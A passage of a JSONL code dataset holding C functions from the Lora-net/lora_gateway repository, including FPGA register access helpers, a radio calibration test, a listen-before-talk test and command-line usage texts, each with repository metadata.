k = 0;\n        for (i = 0; i < RSSI_RANGE; i++) {\n            rssi_histo = (uint16_t)read_burst[2*i] | ((uint16_t)read_burst[2*i+1] << 8);\n            fprintf(log_file, \",%.1f,%d\", -i/2.0, rssi_histo);\n            rssi_cumu += rssi_histo;\n            if (rssi_cumu > rssi_pts) {\n                printf(\" - WARNING: number of RSSI points higher than expected (%u,%u)\", rssi_cumu, rssi_pts);\n                rssi_cumu = rssi_pts;\n            }\n            if (rssi_cumu > rssi_thresh[k]*rssi_pts) {\n                printf(\"  %d%%<%.1f\", (uint16_t)(rssi_thresh[k]*100), -i/2.0);\n                k++;\n            }\n        }\n        fprintf(log_file, \"\\n\");\n        printf(\"\\n\");\n    }\n    fclose(log_file);\n\n    /* Close SPI */\n    x = lgw_disconnect();\n    if(x != 0) {\n        printf(\"ERROR: Failed to disconnect FPGA\\n\");\n        return EXIT_FAILURE;\n    }\n\n    printf(\"+++  Exiting Spectral scan program +++\\n\");\n\n    return EXIT_SUCCESS;\n}", "path": "lora_gateway/util_spectral_scan/src/util_spectral_scan.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* Write to a register addressed by name */\n", "func_signal": "int lgw_fpga_reg_w(uint16_t register_id, int32_t reg_value)", "code": "{\n    int spi_stat = LGW_SPI_SUCCESS;\n    struct lgw_reg_s r;\n\n    /* check input parameters */\n    if (register_id >= LGW_FPGA_TOTALREGS) {\n        DEBUG_MSG(\"ERROR: REGISTER NUMBER OUT OF DEFINED RANGE\\n\");\n        return LGW_REG_ERROR;\n    }\n\n    /* check if SPI is initialised */\n    if (lgw_spi_target == NULL) {\n        DEBUG_MSG(\"ERROR: CONCENTRATOR UNCONNECTED\\n\");\n        return LGW_REG_ERROR;\n    }\n\n    /* get register struct from the struct array */\n    r = fpga_regs[register_id];\n\n    /* reject write to read-only registers */\n    if (r.rdon == 1){\n        DEBUG_MSG(\"ERROR: TRYING TO WRITE A READ-ONLY REGISTER\\n\");\n        return LGW_REG_ERROR;\n    }\n\n    spi_stat += reg_w_align32(lgw_spi_target, LGW_SPI_MUX_MODE1, LGW_SPI_MUX_TARGET_FPGA, r, reg_value);\n\n    if (spi_stat != LGW_SPI_SUCCESS) {\n        DEBUG_MSG(\"ERROR: SPI ERROR DURING REGISTER WRITE\\n\");\n        return LGW_REG_ERROR;\n    } else {\n        return LGW_REG_SUCCESS;\n    }\n}", "path": "lora_gateway/libloragw/src/loragw_fpga.c", "commit_date": "2017-04-05 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* Point to a register by name and do a burst read */\n", "func_signal": "int lgw_fpga_reg_rb(uint16_t register_id, uint8_t *data, uint16_t size)", "code": "{\n    int spi_stat = LGW_SPI_SUCCESS;\n    struct lgw_reg_s r;\n\n    /* check input parameters */\n    CHECK_NULL(data);\n    if (size == 0) {\n        DEBUG_MSG(\"ERROR: BURST OF NULL LENGTH\\n\");\n        return LGW_REG_ERROR;\n    }\n    if (register_id >= LGW_FPGA_TOTALREGS) {\n        DEBUG_MSG(\"ERROR: REGISTER NUMBER OUT OF DEFINED RANGE\\n\");\n        return LGW_REG_ERROR;\n    }\n\n    /* check if SPI is initialised */\n    if (lgw_spi_target == NULL) {\n        DEBUG_MSG(\"ERROR: CONCENTRATOR UNCONNECTED\\n\");\n        return LGW_REG_ERROR;\n    }\n\n    /* get register struct from the struct array */\n    r = fpga_regs[register_id];\n\n    /* do the burst read */\n    spi_stat += lgw_spi_rb(lgw_spi_target, LGW_SPI_MUX_MODE1, LGW_SPI_MUX_TARGET_FPGA, r.addr, data, size);\n\n    if (spi_stat != LGW_SPI_SUCCESS) {\n        DEBUG_MSG(\"ERROR: SPI ERROR DURING REGISTER BURST READ\\n\");\n        return LGW_REG_ERROR;\n    } else {\n        return LGW_REG_SUCCESS;\n    }\n}", "path": "lora_gateway/libloragw/src/loragw_fpga.c", "commit_date": "2017-04-05 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- MAIN FUNCTION -------------------------------------------------------- */\n", "func_signal": "int main(int argc, char **argv)", "code": "{\n    int i, j, x;\n    int32_t read_val;\n    struct lgw_conf_board_s boardconf;\n    struct lgw_conf_rxrf_s rfconf;\n    uint8_t fw_version;\n    uint8_t cal_cmd;\n    uint8_t cal_status;\n    struct cal_res_s cal_res [NB_CAL_MAX];\n    struct cal_res_s cal_res_max;\n    struct cal_res_s cal_res_min;\n    int16_t sig_i [RAM_SIZE];\n    int16_t sig_q [RAM_SIZE];\n    uint8_t img_rej_a [NB_CAL_MAX];\n    uint8_t img_rej_b [NB_CAL_MAX];\n    uint8_t img_rej_a_max;\n    uint8_t img_rej_a_min;\n    uint8_t img_rej_b_max;\n    uint8_t img_rej_b_min;\n    //FILE *file;\n\n    /* command line options */\n    int xi = 0;\n    double xd = 0.0;\n    uint32_t fa = 0, fb = 0;\n    enum lgw_radio_type_e radio_type = LGW_RADIO_TYPE_NONE;\n    uint8_t clocksource = 1; /* Radio B is source by default */\n    uint8_t tx_enable = 0;\n    int nb_cal = 5;\n\n    /* parse command line options */\n    while ((i = getopt (argc, argv, \"ha:b:r:n:k:t:\")) != -1) {\n        switch (i) {\n            case 'h':\n                usage();\n                return -1;\n                break;\n            case 'a': /* <float> Radio A frequency in MHz */\n                sscanf(optarg, \"%lf\", &xd);\n                fa = (uint32_t)((xd*1e6) + 0.5); /* .5 Hz offset to get rounding instead of truncating */\n                break;\n            case 'b': /* <float> Radio B frequency in MHz */\n                sscanf(optarg, \"%lf\", &xd);\n                fb = (uint32_t)((xd*1e6) + 0.5); /* .5 Hz offset to get rounding instead of truncating */\n                break;\n            case 'r': /* <int> Radio type (1255, 1257) */\n                sscanf(optarg, \"%i\", &xi);\n                switch (xi) {\n                    case 1255:\n                        radio_type = LGW_RADIO_TYPE_SX1255;\n                        break;\n                    case 1257:\n                        radio_type = LGW_RADIO_TYPE_SX1257;\n                        break;\n                    default:\n                        printf(\"ERROR: invalid radio type\\n\");\n                        usage();\n                        return -1;\n                }\n                break;\n            case 'n': /* <uint> Number of calibration iterations */\n                i = sscanf(optarg, \"%i\", &xi);\n                if ((i != 1) || (xi > NB_CAL_MAX)) {\n                    printf(\"ERROR: invalid number of calibration iterations (MAX %d)\\n\",NB_CAL_MAX);\n                    usage();\n                    return -1;\n                } else {\n                    nb_cal = xi;\n                }\n                break;\n            case 'k': /* <int> Concentrator clock source (Radio A or Radio B) */\n                sscanf(optarg, \"%i\", &xi);\n                clocksource = (uint8_t)xi;\n                break;\n            case 't': /* <int> Radio to run TX calibration on */\n                sscanf(optarg, \"%i\", &xi);\n                tx_enable = (uint8_t)xi;\n                break;\n            default:\n                printf(\"ERROR: argument parsing\\n\");\n                usage();\n                return -1;\n        }\n    }\n\n    /* check input parameters */\n    if ((fa == 0) || (fb == 0)) {\n        printf(\"ERROR: missing frequency input parameter:\\n\");\n        printf(\"  Radio A RX: %u\\n\", fa);\n        printf(\"  Radio B RX: %u\\n\", fb);\n        usage();\n        return -1;\n    }\n\n    if (radio_type == LGW_RADIO_TYPE_NONE) {\n        printf(\"ERROR: missing radio type parameter:\\n\");\n        usage();\n        return -1;\n    }\n\n    /* starting the concentrator */\n    /* board config */\n    memset(&boardconf, 0, sizeof(boardconf));\n\n    boardconf.lorawan_public = true;\n    boardconf.clksrc = clocksource;\n    lgw_board_setconf(boardconf);\n\n    /* RF config */\n    memset(&rfconf, 0, sizeof(rfconf));\n\n    rfconf.enable = true;\n    rfconf.freq_hz = fa;\n    rfconf.rssi_offset = DEFAULT_RSSI_OFFSET;\n    rfconf.type = radio_type;\n    rfconf.tx_enable = false; /* ignored */\n    lgw_rxrf_setconf(0, rfconf);\n\n    rfconf.freq_hz = fb;\n    rfconf.tx_enable = false; /* ignored */\n    lgw_rxrf_setconf(1, rfconf);\n\n    /* Calibration command */\n    cal_cmd = 0;\n    //cal_cmd |= 0x01; /* Bit 0: Calibrate Rx IQ mismatch compensation on radio A */\n    //cal_cmd |= 0x02; /* Bit 1: Calibrate Rx IQ mismatch compensation on radio B */\n    //cal_cmd |= 0x04; /* Bit 2: Calibrate Tx DC offset on radio A */\n    //cal_cmd |= 0x08; /* Bit 3: Calibrate Tx DC offset on radio B */\n    cal_cmd |= 0x10; /* Bit 4: 0: calibrate with DAC gain=2, 1: with DAC gain=3 (use 3) */\n\n    switch (radio_type) {\n        case LGW_RADIO_TYPE_SX1255:\n            cal_cmd |= 0x20; /* Bit 5: 0: SX1257, 1: SX1255 */\n            break;\n        case LGW_RADIO_TYPE_SX1257:\n            cal_cmd |= 0x00; /* Bit 5: 0: SX1257, 1: SX1255 */\n            break;\n        default:\n            break;\n    }\n\n    cal_cmd |= 0x00; /* Bit 6-7: Board type 0: ref, 1: FPGA, 3: board X */\n\n    /* Recap parameters*/\n    printf(\"Library version information: %s\\n\", lgw_version_info());\n    printf(\"Radio type: %d\\n\",radio_type);\n    printf(\"Radio A frequency: %f MHz\\n\",fa/1e6);\n    printf(\"Radio B frequency: %f MHz\\n\",fb/1e6);\n    printf(\"Number of calibration iterations: %d\\n\",nb_cal);\n    printf(\"Calibration command: brd: %d, chip: %d, dac: %d\\n\\n\", cal_cmd >> 6, 1257-2*((cal_cmd & 0x20) >> 5), 2+((cal_cmd & 0x10) >> 4));\n\n    x = lgw_connect(false, DEFAULT_TX_NOTCH_FREQ);\n    if (x == -1) {\n        printf(\"ERROR: FAIL TO CONNECT BOARD\\n\");\n        return -1;\n    }\n\n    /* reset the registers (also shuts the radios down) */\n    lgw_soft_reset();\n\n    /* ungate clocks (gated by default) */\n    lgw_reg_w(LGW_GLOBAL_EN, 1);\n\n    /* switch on and reset the radios (also starts the 32 MHz XTAL) */\n    lgw_reg_w(LGW_RADIO_A_EN,1);\n    lgw_reg_w(LGW_RADIO_B_EN,1);\n    wait_ms(500); /* TODO: optimize */\n    lgw_reg_w(LGW_RADIO_RST,1);\n    wait_ms(5);\n    lgw_reg_w(LGW_RADIO_RST,0);\n\n    /* setup the radios */\n    lgw_setup_sx125x(0, clocksource, true, radio_type, fa);\n    lgw_setup_sx125x(1, clocksource, false, radio_type, fb);\n\n    /* Set GPIO 4 high for calibration */\n    lgw_reg_w(LGW_GPIO_MODE,31); /* Set all GPIOs as output */\n    lgw_reg_w(LGW_GPIO_SELECT_OUTPUT,2); /* AGC MCU drives GPIOs */\n\n    /* Load the calibration firmware  */\n    load_firmware(MCU_AGC, cal_firmware, MCU_AGC_FW_BYTE);\n    lgw_reg_w(LGW_MCU_RST_1,0);\n    lgw_reg_w(LGW_DBG_AGC_MCU_RAM_ADDR, FW_VERSION_ADDR);\n    lgw_reg_r(LGW_DBG_AGC_MCU_RAM_DATA, &read_val);\n    fw_version = (uint8_t)read_val;\n    if (fw_version != FW_VERSION_CAL) {\n        printf(\"ERROR: Version of calibration firmware not expected, actual:%d expected:%d\\n\", fw_version, FW_VERSION_CAL);\n        return -1;\n    }\n\n    /* Run Rx A IQ mismatch calibration only */\n    for (i=0; i<nb_cal; i++) {\n        cal_status = sx125x_cal(cal_cmd | 0x01, &cal_res[i]);\n        x = read_capture(sig_i, sig_q, RAM_SIZE);\n        /*\n        file = fopen(\"toto.txt\",\"w\");\n        for (j=0; j<RAM_SIZE; j++) {\n            fprintf(file, \"%d %d\\n\", sig_i[j], sig_q[j]);\n        }\n        fclose(file);\n        */\n        img_rej_a[i] = get_img_rej(sig_i, sig_q, RAM_SIZE, FREQ_SIG_NORM);\n\n        printf(\"Rx A IQ mismatch: Amp: %3d Phi: %3d Rej: %2d dB Status: %3d | Debug: Rej: %2d dB Lna: %1d BB: %2d Dec: %2d\\n\", cal_res[i].amp_a, cal_res[i].phi_a, cal_res[i].img_rej_a, cal_status, img_rej_a[i], cal_res[i].debug[0], cal_res[i].debug[1], cal_res[i].debug[2]);\n    }\n\n    /* Run Rx B IQ mismatch calibation only */\n    printf(\"\\n\");\n    for (i=0; i<nb_cal; i++) {\n        cal_status = sx125x_cal(cal_cmd | 0x02, &cal_res[i]);\n        x = read_capture(sig_i, sig_q, RAM_SIZE);\n        img_rej_b[i] = get_img_rej(sig_i, sig_q, RAM_SIZE, FREQ_SIG_NORM);\n\n        printf(\"Rx B IQ mismatch: Amp: %3d Phi: %3d Rej: %2d dB Status: %3d | Debug: Rej: %2d dB Lna: %1d BB: %2d Dec: %2d\\n\", cal_res[i].amp_b, cal_res[i].phi_b, cal_res[i].img_rej_b, cal_status, img_rej_b[i], cal_res[i].debug[0], cal_res[i].debug[1], cal_res[i].debug[2]);\n    }\n\n    /* Run Tx A DC offset calibation only */\n    printf(\"\\n\");\n    if ((tx_enable == 1) || (tx_enable == 3)) {\n        for (i=0; i<nb_cal; i++) {\n            cal_status = sx125x_cal(cal_cmd | 0x04, &cal_res[i]);\n\n            printf(\"Tx A DC offset I :\");\n            for (j=0; j<8; j++) {\n                printf(\" %3d\", cal_res[i].offset_i_a[j]);\n            }\n            printf(\"\\n\");\n            printf(\"Tx A DC offset Q :\");\n            for (j=0; j<8; j++) {\n                printf(\" %3d\", cal_res[i].offset_q_a[j]);\n            }\n            printf(\"\\n\");\n            printf(\"Tx A DC rejection:\");\n            for (j=0; j<8; j++) {\n                printf(\" %3d\", cal_res[i].offset_rej_a[j]);\n            }\n            printf(\"\\n\");\n            printf(\"Tx A DC debug BB :\");\n            for (j=0; j<8; j++) {\n                printf(\" %3d\", (cal_res[i].debug[j] & 0xF0) >> 4);\n            }\n            printf(\"\\n\");\n            printf(\"Tx A DC debug Dec:\");\n            for (j=0; j<8; j++) {\n                printf(\" %3d\", cal_res[i].debug[j] & 0x0F);\n            }\n            printf(\"\\n\");\n            printf(\"Tx A DC Status   : %3d\\n\", cal_status);\n        }\n    } else {\n        printf(\"Tx A calibration bypassed\\n\");\n    }\n\n    /* Run Tx B DC offset calibation only */\n    printf(\"\\n\");\n    if ((tx_enable == 2) || (tx_enable == 3)) {\n        for (i=0; i<nb_cal; i++) {\n            cal_status = sx125x_cal(cal_cmd | 0x08, &cal_res[i]);\n\n            printf(\"Tx B DC offset I :\");\n            for (j=0; j<8; j++) {\n                printf(\" %3d\", cal_res[i].offset_i_b[j]);\n            }\n            printf(\"\\n\");\n            printf(\"Tx B DC offset Q :\");\n            for (j=0; j<8; j++) {\n                printf(\" %3d\", cal_res[i].offset_q_b[j]);\n            }\n            printf(\"\\n\");\n            printf(\"Tx B DC rejection:\");\n            for (j=0; j<8; j++) {\n                printf(\" %3d\", cal_res[i].offset_rej_b[j]);\n            }\n            printf(\"\\n\");\n            printf(\"Tx B DC debug BB :\");\n            for (j=0; j<8; j++) {\n                printf(\" %3d\", (cal_res[i].debug[j] & 0xF0) >> 4);\n            }\n            printf(\"\\n\");\n            printf(\"Tx B DC debug Dec:\");\n            for (j=0; j<8; j++) {\n                printf(\" %3d\", cal_res[i].debug[j] & 0x0F);\n            }\n            printf(\"\\n\");\n            printf(\"Tx B DC Status   : %3d\\n\", cal_status);\n        }\n    }  else {\n        printf(\"Tx B calibration bypassed\\n\");\n    }\n\n    /* Compute statistics */\n    cal_res_max.amp_a = -128;\n    cal_res_max.phi_a = -128;\n    cal_res_max.amp_b = -128;\n    cal_res_max.phi_b = -128;\n    cal_res_max.img_rej_a = 0;\n    cal_res_max.img_rej_b = 0;\n    for (j=0; j<8; j++) {\n        cal_res_max.offset_i_a[j] = -128;\n        cal_res_max.offset_q_a[j] = -128;\n        cal_res_max.offset_i_b[j] = -128;\n        cal_res_max.offset_q_b[j] = -128;\n        cal_res_max.offset_rej_a[j] = 0;\n        cal_res_max.offset_rej_b[j] = 0;\n    }\n\n    cal_res_min.amp_a = 127;\n    cal_res_min.phi_a = 127;\n    cal_res_min.amp_b = 127;\n    cal_res_min.phi_b = 127;\n    cal_res_min.img_rej_a = 255;\n    cal_res_min.img_rej_b = 255;\n    for (j=0; j<8; j++) {\n        cal_res_min.offset_i_a[j] = 127;\n        cal_res_min.offset_q_a[j] = 127;\n        cal_res_min.offset_i_b[j] = 127;\n        cal_res_min.offset_q_b[j] = 127;\n        cal_res_min.offset_rej_a[j] = 255;\n        cal_res_min.offset_rej_b[j] = 255;\n    }\n\n    img_rej_a_max = 0;\n    img_rej_a_min = 255;\n    img_rej_b_max = 0;\n    img_rej_b_min = 255;\n\n    for (i=0; i<nb_cal; i++) {\n        if (cal_res[i].amp_a > cal_res_max.amp_a) {\n            cal_res_max.amp_a = cal_res[i].amp_a;\n        }\n        if (cal_res[i].phi_a > cal_res_max.phi_a) {\n            cal_res_max.phi_a = cal_res[i].phi_a;\n        }\n        if (cal_res[i].amp_b > cal_res_max.amp_b) {\n            cal_res_max.amp_b = cal_res[i].amp_b;\n        }\n        if (cal_res[i].phi_b > cal_res_max.phi_b) {\n            cal_res_max.phi_b = cal_res[i].phi_b;\n        }\n        if (cal_res[i].phi_b > cal_res_max.phi_b) {\n            cal_res_max.phi_b = cal_res[i].phi_b;\n        }\n        if (cal_res[i].img_rej_a > cal_res_max.img_rej_a) {\n            cal_res_max.img_rej_a = cal_res[i].img_rej_a;\n        }\n        if (cal_res[i].img_rej_b > cal_res_max.img_rej_b) {\n            cal_res_max.img_rej_b = cal_res[i].img_rej_b;\n        }\n        for (j=0; j<8; j++) {\n            if (cal_res[i].offset_i_a[j]  > cal_res_max.offset_i_a[j]) {\n                cal_res_max.offset_i_a[j] = cal_res[i].offset_i_a[j];\n            }\n            if (cal_res[i].offset_q_a[j] > cal_res_max.offset_q_a[j]) {\n                cal_res_max.offset_q_a[j] = cal_res[i].offset_q_a[j];\n            }\n            if (cal_res[i].offset_i_b[j] > cal_res_max.offset_i_b[j]) {\n                cal_res_max.offset_i_b[j] = cal_res[i].offset_i_b[j];\n            }\n            if (cal_res[i].offset_q_b[j] > cal_res_max.offset_q_b[j]) {\n                cal_res_max.offset_q_b[j] = cal_res[i].offset_q_b[j];\n            }\n            if (cal_res[i].offset_rej_a[j] > cal_res_max.offset_rej_a[j]) {\n                cal_res_max.offset_rej_a[j] = cal_res[i].offset_rej_a[j];\n            }\n            if (cal_res[i].offset_rej_b[j] > cal_res_max.offset_rej_b[j]) {\n                cal_res_max.offset_rej_b[j] = cal_res[i].offset_rej_b[j];\n            }\n        }\n\n        if (cal_res[i].amp_a < cal_res_min.amp_a) {\n            cal_res_min.amp_a = cal_res[i].amp_a;\n        }\n        if (cal_res[i].phi_a < cal_res_min.phi_a) {\n            cal_res_min.phi_a = cal_res[i].phi_a;\n        }\n        if (cal_res[i].amp_b < cal_res_min.amp_b) {\n            cal_res_min.amp_b = cal_res[i].amp_b;\n        }\n        if (cal_res[i].phi_b < cal_res_min.phi_b) {\n            cal_res_min.phi_b = cal_res[i].phi_b;\n        }\n        if (cal_res[i].phi_b < cal_res_min.phi_b) {\n            cal_res_min.phi_b = cal_res[i].phi_b;\n        }\n        if (cal_res[i].img_rej_a < cal_res_min.img_rej_a) {\n            cal_res_min.img_rej_a = cal_res[i].img_rej_a;\n        }\n        if (cal_res[i].img_rej_b < cal_res_min.img_rej_b) {\n            cal_res_min.img_rej_b = cal_res[i].img_rej_b;\n        }\n        for (j=0; j<8; j++) {\n            if (cal_res[i].offset_i_a[j] < cal_res_min.offset_i_a[j]) {\n                cal_res_min.offset_i_a[j] = cal_res[i].offset_i_a[j];\n            }\n            if (cal_res[i].offset_q_a[j] < cal_res_min.offset_q_a[j]) {\n                cal_res_min.offset_q_a[j] = cal_res[i].offset_q_a[j];\n            }\n            if (cal_res[i].offset_i_b[j] < cal_res_min.offset_i_b[j]) {\n                cal_res_min.offset_i_b[j] = cal_res[i].offset_i_b[j];\n            }\n            if (cal_res[i].offset_q_b[j] < cal_res_min.offset_q_b[j]) {\n                cal_res_min.offset_q_b[j] = cal_res[i].offset_q_b[j];\n            }\n            if (cal_res[i].offset_rej_a[j] < cal_res_min.offset_rej_a[j]) {\n                cal_res_min.offset_rej_a[j] = cal_res[i].offset_rej_a[j];\n            }\n            if (cal_res[i].offset_rej_b[j] < cal_res_min.offset_rej_b[j]) {\n                cal_res_min.offset_rej_b[j] = cal_res[i].offset_rej_b[j];\n            }\n        }\n\n        if (img_rej_a[i] > img_rej_a_max) {\n            img_rej_a_max = img_rej_a[i];\n        }\n        if (img_rej_a[i] < img_rej_a_min) {\n            img_rej_a_min = img_rej_a[i];\n        }\n        if (img_rej_b[i] > img_rej_b_max) {\n            img_rej_b_max = img_rej_b[i];\n        }\n        if (img_rej_b[i] < img_rej_b_min) {\n            img_rej_b_min = img_rej_b[i];\n        }\n    }\n\n    /* Print statistics */\n    printf(\"\\n\");\n    printf(\"Rx A IQ mismatch calibration statistics on %3d iterations (min, max):\\n\", nb_cal);\n    printf(\"Amp: %3d %3d Phi: %3d %3d Rej: %2d %2d dB (capt.: %2d %2d dB)\\n\", cal_res_min.amp_a, cal_res_max.amp_a, cal_res_min.phi_a, cal_res_max.phi_a, cal_res_min.img_rej_a, cal_res_max.img_rej_a, img_rej_a_min, img_rej_a_max);\n\n    printf(\"\\n\");\n    printf(\"Rx B IQ mismatch calibration statistics on %3d iterations (min, max):\\n\", nb_cal);\n    printf(\"Amp: %3d %3d Phi: %3d %3d Rej: %2d %2d dB (capt.: %2d %2d dB)\\n\", cal_res_min.amp_b, cal_res_max.amp_b, cal_res_min.phi_b, cal_res_max.phi_b, cal_res_min.img_rej_b, cal_res_max.img_rej_b, img_rej_b_min, img_rej_b_max);\n\n    if ((tx_enable == 1) || (tx_enable == 3)) {\n        printf(\"\\n\");\n        printf(\"Tx A DC offset calibration statistics on %3d iterations (min, max):\\n\", nb_cal);\n        for (j=0; j<8; j++) {\n            printf(\" Mix gain %2d: I: %3d %3d Q: %3d %3d Rej: %2d %2d dB\\n\", 8+j, cal_res_min.offset_i_a[j], cal_res_max.offset_i_a[j], cal_res_min.offset_q_a[j], cal_res_max.offset_q_a[j], cal_res_min.offset_rej_a[j], cal_res_max.offset_rej_a[j]);\n        }\n    }\n\n    if ((tx_enable == 2) || (tx_enable == 3)) {\n        printf(\"\\n\");\n        printf(\"Tx B DC offset calibration statistics on %3d iterations (min, max):\\n\", nb_cal);\n        for (j=0; j<8; j++) {\n            printf(\" Mix gain %2d: I: %3d %3d Q: %3d %3d Rej: %2d %2d dB\\n\", 8+j, cal_res_min.offset_i_b[j], cal_res_max.offset_i_b[j], cal_res_min.offset_q_b[j], cal_res_max.offset_q_b[j], cal_res_min.offset_rej_b[j], cal_res_max.offset_rej_b[j]);\n        }\n    }\n\n    lgw_stop();\n\n    printf(\"\\nEnd of radio calibration test\\n\");\n\n    return 0;\n}", "path": "lora_gateway/libloragw/tst/test_loragw_cal.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* describe command line options */\n", "func_signal": "void usage(void)", "code": "{\n    printf(\"Library version information: %s\\n\", lgw_version_info());\n    printf( \"Available options:\\n\");\n    printf( \" -h print this help\\n\");\n    printf( \" -a <float> Radio A frequency in MHz\\n\");\n    printf( \" -b <float> Radio B frequency in MHz\\n\");\n    printf( \" -r <int> Radio type (SX1255:1255, SX1257:1257)\\n\");\n    printf( \" -n <uint> Number of calibration iterations\\n\");\n    printf( \" -k <int> Concentrator clock source (0:radio_A, 1:radio_B(default))\\n\");\n    printf( \" -t <int> Radio to run TX calibration on (0:None(default), 1:radio_A, 2:radio_B, 3:both)\\n\");\n}", "path": "lora_gateway/libloragw/tst/test_loragw_cal.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* describe command line options */\n", "func_signal": "void usage(void)", "code": "{\n    printf(\"Available options:\\n\");\n    printf(\" -h print this help\\n\");\n    printf(\" -f <float> frequency in MHz of the first LBT channel\\n\");\n    printf(\" -o <int>   offset in dB to be applied to the SX127x RSSI [-128..127]\\n\");\n    printf(\" -r <int>   target RSSI: signal strength target used to detect if the channel is clear or not [-128..0]\\n\");\n    printf(\" -s <uint>  scan time in \u00b5s for all 8 LBT channels [128,5000]\\n\");\n}", "path": "lora_gateway/util_lbt_test/src/util_lbt_test.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- PUBLIC FUNCTIONS DEFINITION ------------------------------------------ */\n", "func_signal": "int lgw_board_setconf(struct lgw_conf_board_s conf)", "code": "{\n\n    /* check if the concentrator is running */\n    if (lgw_is_started == true) {\n        DEBUG_MSG(\"ERROR: CONCENTRATOR IS RUNNING, STOP IT BEFORE TOUCHING CONFIGURATION\\n\");\n        return LGW_HAL_ERROR;\n    }\n\n    /* set internal config according to parameters */\n    lorawan_public = conf.lorawan_public;\n    rf_clkout = conf.clksrc;\n\n    DEBUG_PRINTF(\"Note: board configuration; lorawan_public:%d, clksrc:%d\\n\", lorawan_public, rf_clkout);\n\n    return LGW_HAL_SUCCESS;\n}", "path": "lora_gateway/libloragw/src/loragw_hal.c", "commit_date": "2017-04-05 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* describe command line options */\n", "func_signal": "void usage(void)", "code": "{\n    printf(\"*** Library version information ***\\n%s\\n\\n\", lgw_version_info());\n    printf( \"Available options:\\n\");\n    printf( \" -h print this help\\n\");\n    printf( \" -r <int> rotate log file every N seconds (-1 disable log rotation)\\n\");\n}", "path": "lora_gateway/util_pkt_logger/src/util_pkt_logger.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- PRIVATE FUNCTIONS DEFINITION ----------------------------------------- */\n", "func_signal": "static void sig_handler(int sigio)", "code": "{\n    if (sigio == SIGQUIT) {\n        quit_sig = 1;;\n    } else if ((sigio == SIGINT) || (sigio == SIGTERM)) {\n        exit_sig = 1;\n    }\n}", "path": "lora_gateway/libloragw/tst/test_loragw_hal.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* Read to a register addressed by name */\n", "func_signal": "int lgw_fpga_reg_r(uint16_t register_id, int32_t *reg_value)", "code": "{\n    int spi_stat = LGW_SPI_SUCCESS;\n    struct lgw_reg_s r;\n\n    /* check input parameters */\n    CHECK_NULL(reg_value);\n    if (register_id >= LGW_FPGA_TOTALREGS) {\n        DEBUG_MSG(\"ERROR: REGISTER NUMBER OUT OF DEFINED RANGE\\n\");\n        return LGW_REG_ERROR;\n    }\n\n    /* check if SPI is initialised */\n    if (lgw_spi_target == NULL) {\n        DEBUG_MSG(\"ERROR: CONCENTRATOR UNCONNECTED\\n\");\n        return LGW_REG_ERROR;\n    }\n\n    /* get register struct from the struct array */\n    r = fpga_regs[register_id];\n\n    spi_stat += reg_r_align32(lgw_spi_target, LGW_SPI_MUX_MODE1, LGW_SPI_MUX_TARGET_FPGA, r, reg_value);\n\n    if (spi_stat != LGW_SPI_SUCCESS) {\n        DEBUG_MSG(\"ERROR: SPI ERROR DURING REGISTER WRITE\\n\");\n        return LGW_REG_ERROR;\n    } else {\n        return LGW_REG_SUCCESS;\n    }\n}", "path": "lora_gateway/libloragw/src/loragw_fpga.c", "commit_date": "2017-04-05 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- MAIN FUNCTION -------------------------------------------------------- */\n", "func_signal": "int main(int argc, char **argv)", "code": "{\n    int i;\n    int xi = 0;\n\n    /* in/out variables */\n    double f1 = 0.0;\n    uint32_t f_init = 0; /* in Hz */\n    uint32_t f_start = 0; /* in Hz */\n    uint16_t loop_cnt = 0;\n    int8_t rssi_target_dBm = -80;\n    uint16_t scan_time_us = 128;\n    uint32_t timestamp;\n    uint8_t rssi_value;\n    int8_t rssi_offset = DEFAULT_SX127X_RSSI_OFFSET;\n    int32_t val, val2;\n    int channel;\n    uint32_t freq_offset;\n\n    /* parse command line options */\n    while ((i = getopt (argc, argv, \"h:f:s:r:o:\")) != -1) {\n        switch (i) {\n            case 'h':\n                usage();\n                return EXIT_FAILURE;\n                break;\n\n            case 'f':\n                i = sscanf(optarg, \"%lf\", &f1);\n                if ((i != 1) || (f1 < 30.0) || (f1 > 3000.0)) {\n                    MSG(\"ERROR: Invalid LBT start frequency\\n\");\n                    usage();\n                    return EXIT_FAILURE;\n                } else {\n                    f_start = (uint32_t)((f1*1e6) + 0.5);/* .5 Hz offset to get rounding instead of truncating */\n                }\n                break;\n            case 's':\n                i = sscanf(optarg, \"%i\", &xi);\n                if ((i != 1) || ((xi != 128) && (xi != 5000))) {\n                    MSG(\"ERROR: scan_time_us must be 128 or 5000 \\n\");\n                    usage();\n                    return EXIT_FAILURE;\n                } else {\n                    scan_time_us = xi;\n                }\n                break;\n            case 'r':\n                i = sscanf(optarg, \"%i\", &xi);\n                if ((i != 1) || ((xi < -128) && (xi > 0))) {\n                    MSG(\"ERROR: rssi_target must be b/w -128 & 0 \\n\");\n                    usage();\n                    return EXIT_FAILURE;\n                } else {\n                    rssi_target_dBm = xi;\n                }\n                break;\n            case 'o': /* -o <int>  SX127x RSSI offset [-128..127] */\n                i = sscanf(optarg, \"%i\", &xi);\n                if((i != 1) || (xi < -128) || (xi > 127)) {\n                    MSG(\"ERROR: rssi_offset must be 